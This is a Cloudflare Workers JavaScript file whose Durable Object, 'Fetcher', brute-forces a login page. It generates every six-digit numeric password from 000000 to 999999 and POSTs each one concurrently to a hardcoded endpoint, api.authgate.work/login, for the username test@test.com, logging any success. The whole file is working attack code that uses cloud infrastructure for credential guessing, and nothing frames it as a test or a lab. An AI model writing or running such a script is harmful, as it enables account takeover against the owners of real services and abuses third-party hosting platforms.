/**
 * Welcome to Cloudflare Workers! This is your first worker.
 *
 * - Run `npm run dev` in your terminal to start a development server
 * - Open a browser tab at http://localhost:8787/ to see your worker in action
 * - Run `npm run deploy` to publish your worker
 *
 * Learn more at https://developers.cloudflare.com/workers/
 */

export default {
	async fetch(request, env, ctx) {
		// Get the ID of the Durable Object.
		const id = env.authgate.idFromName('Fetcher');

		// Get the instance of the Durable Object.
		const obj = env.authgate.get(id);

		// Use the Durable Object.
		const response = await obj.fetch(request);

		return response;
	},
};

export class Fetcher {
	constructor(state, env) {
		this.state = state;
	}

	async fetch(request) {
		// Generate and try all six-digit number permutations as passwords
		const targetUrl = 'https://api.authgate.work/login';
		const passwords = generateSixDigitNumberPermutations();
		const promises = [];

		for (const password of passwords) {
			const formData = new FormData();
			formData.append('username', 'test@test.com'); // Username is known
			formData.append('password', password);

			let promise = fetch(targetUrl, {
				method: 'POST',
				body: formData,
			}).then((response) => {
				if (response.status === 200) {
					// Handle successful login
					console.log('Login successfully!');
				} else {
					// Handle failed login
					console.log('Failed login.');
				}
			});

			promises.push(promise);
		}

		await Promise.all(promises);

		return new Response('Login attempts with all six-digit number permutations completed.', { status: 200 });
	}
}

function generateSixDigitNumberPermutations() {
	const passwords = [];
	for (let i = 0; i < 1000000; i++) {
		const password = i.toString().padStart(6, '0');
		passwords.push(password);
	}
	return passwords;
}
